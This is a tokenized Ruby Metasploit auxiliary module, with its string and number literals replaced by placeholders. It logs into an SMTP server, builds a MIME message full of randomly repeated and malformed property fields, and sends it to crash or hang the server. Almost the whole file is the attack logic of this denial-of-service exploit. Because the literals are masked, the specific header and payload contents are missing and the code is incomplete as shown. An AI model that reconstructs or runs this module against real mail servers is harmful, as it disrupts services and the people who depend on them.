require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Smtp include Msf :: Auxiliary :: Dos def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) ] , self . class ) end def run connect_login modprops = [ <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> , <str> ] modpropshort = <str> modpropbusted = <str> modnum = rand ( <int> ) <int> . upto ( modnum ) { nextprop = rand ( modprops . size ) modpropshort << modprops [ nextprop ] + <str> modpropbusted << modprops [ nextprop ] . upcase + <str> } modpropshort = <str> modpropbusted = <str> modnum = modnum + <int> + rand ( <int> ) modproplong = modpropshort <int> . upto ( modnum ) { modproplong << modprops [ rand ( modprops . size ) ] + <str> } boundry = Rex :: Text . rand_text_alphanumeric ( <int> ) + <str> + Rex :: Text . rand_text_alphanumeric ( <int> ) modpropshort = <str> modproplong = <str> modpropbusted = <str> mail = <str> datastore [ <str> ] <str> mail << <str> datastore [ <str> ] <str> mail << <str> datastore [ <str> ] <str> mail << <str> mail << <str> mail << <str> boundry <str> mail << <str> mail << <str> mail << <str> boundry <str> mail << <str> mail << <str> mail << <str> mail << <str> mail << <str> mail << <str> mail << <str> modpropshort . chop <str> mail << modpropbusted mail << <str> mail << <str> mail << <str> modproplong . chop <str> mail << <str> mail << <str> mail << <str> boundry <str> mail << <str> print_status ( <str> ) sock . put ( mail ) sock . put ( <str> ) print <str> + ( sock . get_once || <str> ) disconnect end end 
